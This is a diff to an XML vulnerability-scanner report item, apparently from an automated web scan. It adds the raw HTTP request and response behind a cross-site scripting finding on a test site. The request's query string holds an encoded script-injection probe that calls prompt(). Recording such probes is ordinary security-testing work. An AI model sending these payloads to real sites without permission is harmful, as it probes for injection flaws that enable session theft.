@@ -9,4 +9,24 @@
   <AOP_SourceLine>0</AOP_SourceLine>
   <AOP_Additional><![CDATA[]]></AOP_Additional>
   <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
+  <TechnicalDetails>
+    <Request><![CDATA[GET /hpp/params.php?p=1'%22()%26%25&lt;ScRiPt%20&gt;prompt(951846)&lt;/ScRiPt&gt;&amp;pp=1 HTTP/1.1
+Referer: http://testphp.vulnweb.com:80/
+Host: testphp.vulnweb.com
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36
+Accept: */*
+
+]]></Request>
+    <Response><![CDATA[HTTP/1.1 200 OK
+Server: nginx/1.4.1
+Date: Tue, 07 Oct 2014 17:30:28 GMT
+Content-Type: text/html
+Connection: keep-alive
+X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
+Original-Content-Encoding: gzip
+Content-Length: 40
+]]></Response>
+  </TechnicalDetails>
 </ReportItem>
